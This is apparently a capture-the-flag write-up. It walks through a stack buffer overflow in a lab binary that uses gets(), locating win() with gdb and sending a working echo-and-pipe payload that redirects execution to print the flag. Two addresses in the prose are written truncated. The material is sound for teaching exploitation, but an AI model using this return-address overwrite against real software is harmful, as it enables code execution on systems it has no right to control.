If we run the vulnerable program using `./vuln`, and pass `ABC` as input, we get the following output:

```
Please enter your string:
ABC
Okay, time to return... Fingers Crossed... Jumping to 0x804932f
```



Now, let's observe the contents of `vuln.c`. Specifically, let's look at the `vuln()` function:

```c
void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}
```



As you can see, the string `Jumping to 0x804932f` comes from this function, with `get_return_address()` returning the address the function should return to. In most cases, this will take our program to line `40` in `main()`. Overwriting this return address will be our attack target!



As you can see above, `vuln()` contains the `gets()` function. If we observe the documentation for `gets()` using `man gets`, we can see the following in the manual:

```
Never use gets().  Because it is impossible to tell without knowing the data in advance  how  many  characters
gets()  will  read, and because gets() will continue to store characters past the end of the buffer, it is ex‐
tremely dangerous to use.  It has been used to break computer security.  Use fgets() instead.
```



So, our `vuln()` function contains an insecure C function that allows us to perform a buffer overflow right before our function returns. How convenient!



We can probe at this by simply passing in repeating letters from the alphabet, as seen below:

```
> ./vuln

Please enter your string:
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
Okay, time to return... Fingers Crossed... Jumping to 0x4c4c4c4c
Segmentation fault
```



As you can see, our input was long enough to completely overwrite the return address of `vuln()`. In this example, the overwritten address became `0x4c4c4c4c`. If we convert this to ASCII, we can see this is equal to `LLLL`. So, if we shorten our input and replace `LLLL` with `ABCD`, we get the following:

```
Please enter your string:
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKABCD
Okay, time to return... Fingers Crossed... Jumping to 0x44434241
Segmentation fault
```



Our new return address has become `0x44434241`, which is the hexadecimal equivalent of `ABCD`. So, we can replace `ABCD` with any value we want and specify what area of memory we want our program to continue execution in. In our case, we need to obtain the flag which is displayed in the `win()` function. So, if we specify the location of `win()`, we should be golden! 



But, how do we get the location of `win()`? This is where `gdb` comes into play!



If we run the following:

```bash
gdb vuln
disassemble main
```

We see the following:

```
Dump of assembler code for function main:
   0x080492c4 <+0>:     endbr32
   0x080492c8 <+4>:     lea    0x4(%esp),%ecx
   0x080492cc <+8>:     and    $0xfffffff0,%esp
   0x080492cf <+11>:    pushl  -0x4(%ecx)
   0x080492d2 <+14>:    push   %ebp
   0x080492d3 <+15>:    mov    %esp,%ebp
   0x080492d5 <+17>:    push   %ebx
   0x080492d6 <+18>:    push   %ecx
   0x080492d7 <+19>:    sub    $0x10,%esp
   0x080492da <+22>:    call   0x8049130 <__x86.get_pc_thunk.bx>
   0x080492df <+27>:    add    $0x2d21,%ebx
   0x080492e5 <+33>:    mov    -0x4(%ebx),%eax
   0x080492eb <+39>:    mov    (%eax),%eax
   0x080492ed <+41>:    push   $0x0
   0x080492ef <+43>:    push   $0x2
   0x080492f1 <+45>:    push   $0x0
   0x080492f3 <+47>:    push   %eax
   0x080492f4 <+48>:    call   0x80490b0 <setvbuf@plt>
   0x080492f9 <+53>:    add    $0x10,%esp
   0x080492fc <+56>:    call   0x8049070 <getegid@plt>
   0x08049301 <+61>:    mov    %eax,-0xc(%ebp)
   0x08049304 <+64>:    sub    $0x4,%esp
   0x08049307 <+67>:    pushl  -0xc(%ebp)
   0x0804930a <+70>:    pushl  -0xc(%ebp)
   0x0804930d <+73>:    pushl  -0xc(%ebp)
   0x08049310 <+76>:    call   0x80490d0 <setresgid@plt>
   0x08049315 <+81>:    add    $0x10,%esp
   0x08049318 <+84>:    sub    $0xc,%esp
   0x0804931b <+87>:    lea    -0x1f60(%ebx),%eax
   0x08049321 <+93>:    push   %eax
   0x08049322 <+94>:    call   0x8049080 <puts@plt>
   0x08049327 <+99>:    add    $0x10,%esp
   0x0804932a <+102>:   call   0x8049281 <vuln>
   0x0804932f <+107>:   mov    $0x0,%eax
   0x08049334 <+112>:   lea    -0x8(%ebp),%esp
   0x08049337 <+115>:   pop    %ecx
   0x08049338 <+116>:   pop    %ebx
   0x08049339 <+117>:   pop    %ebp
   0x0804933a <+118>:   lea    -0x4(%ecx),%esp
   0x0804933d <+121>:   ret
End of assembler dump.
```



This `gdb` output contains the disassembled machine code of our `main()` function, displaying its contents as assembly with its corresponding location on the left. So, the `main()` function begins at address `0x080492c`.



Well, what about `win()`? In `gdb`, we can simply run `disassemble win`:

```
Dump of assembler code for function win:
   0x080491f6 <+0>:     endbr32
   0x080491fa <+4>:     push   %ebp
   0x080491fb <+5>:     mov    %esp,%ebp
   0x080491fd <+7>:     push   %ebx
   0x080491fe <+8>:     sub    $0x54,%esp
   0x08049201 <+11>:    call   0x8049130 <__x86.get_pc_thunk.bx>
   0x08049206 <+16>:    add    $0x2dfa,%ebx
   0x0804920c <+22>:    sub    $0x8,%esp
   0x0804920f <+25>:    lea    -0x1ff8(%ebx),%eax
   0x08049215 <+31>:    push   %eax
   0x08049216 <+32>:    lea    -0x1ff6(%ebx),%eax
   0x0804921c <+38>:    push   %eax
   0x0804921d <+39>:    call   0x80490c0 <fopen@plt>
   0x08049222 <+44>:    add    $0x10,%esp
   0x08049225 <+47>:    mov    %eax,-0xc(%ebp)
   0x08049228 <+50>:    cmpl   $0x0,-0xc(%ebp)
   0x0804922c <+54>:    jne    0x8049258 <win+98>
   0x0804922e <+56>:    sub    $0x4,%esp
   0x08049231 <+59>:    lea    -0x1fed(%ebx),%eax
   0x08049237 <+65>:    push   %eax
   0x08049238 <+66>:    lea    -0x1fd8(%ebx),%eax
   0x0804923e <+72>:    push   %eax
   0x0804923f <+73>:    lea    -0x1fa3(%ebx),%eax
   0x08049245 <+79>:    push   %eax
   0x08049246 <+80>:    call   0x8049040 <printf@plt>
   0x0804924b <+85>:    add    $0x10,%esp
   0x0804924e <+88>:    sub    $0xc,%esp
   0x08049251 <+91>:    push   $0x0
   0x08049253 <+93>:    call   0x8049090 <exit@plt>
   0x08049258 <+98>:    sub    $0x4,%esp
   0x0804925b <+101>:   pushl  -0xc(%ebp)
   0x0804925e <+104>:   push   $0x40
   0x08049260 <+106>:   lea    -0x4c(%ebp),%eax
   0x08049263 <+109>:   push   %eax
   0x08049264 <+110>:   call   0x8049060 <fgets@plt>
   0x08049269 <+115>:   add    $0x10,%esp
   0x0804926c <+118>:   sub    $0xc,%esp
   0x0804926f <+121>:   lea    -0x4c(%ebp),%eax
   0x08049272 <+124>:   push   %eax
   0x08049273 <+125>:   call   0x8049040 <printf@plt>
   0x08049278 <+130>:   add    $0x10,%esp
   0x0804927b <+133>:   nop
   0x0804927c <+134>:   mov    -0x4(%ebp),%ebx
   0x0804927f <+137>:   leave
   0x08049280 <+138>:   ret
End of assembler dump.
```



So, our `win()` function begins at address `0x080491f`. So, in our input, we need to specify the address `0x080491f` in place of `ABCD`, and our program should begin execution there. But `0x080491f` doesn't contain ASCII characters, so how do we send this binary input to our executable? Thankfully, `echo` has us covered!



You can echo binary data in `echo` using

```bash
echo -e "\xAB\xCD\xEF" 
```



So, our input would be echoed using the following:

```bash
echo -e "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK\xf6\x91\x04\x08"
```



Note that the order of bytes is flipped due to endianness.



We can then pipe our input into our executable as such:

```bash
echo -e "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK\xf6\x91\x04\x08" | ./vuln
```



Which results in the following:

```
Please enter your string:
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
pico_ctf{YOURFLAG}
Segmentation fault
```



Woohoo! By using a buffer overflow through `gets()`, we have succesfully overwritten the return address of `vuln()` to execute a function of our choice, resulting in the flag being displayed.








































